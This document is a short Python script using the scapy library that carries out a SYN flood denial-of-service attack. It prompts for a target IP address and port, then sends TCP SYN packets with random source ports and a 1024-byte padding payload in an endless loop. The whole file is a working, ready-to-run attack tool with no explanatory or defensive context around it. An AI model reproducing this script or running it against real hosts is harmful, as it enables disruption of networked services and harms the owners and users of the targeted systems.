import scapy.all as scapy

def SYN_Flooding(dstIP, dstPort):
    ip= scapy.IP(dst=dstIP)  
    tcp = scapy.TCP(sport=scapy.RandShort(), dport=dstPort, flags="S")
    raw = scapy.Raw(b"X"*1024)
    p = ip / tcp / raw
    scapy.send(p, loop=1, verbose=0)

if __name__ == "__main__":
    try:
        dstIP = input("Enter your target IP (exa. '10.120.0.190') : ")
        dstPort = int(input("Enter your target Port (exa. '80') : "))
        SYN_Flooding(dstIP, dstPort)
    except:
        print("Something went wrong")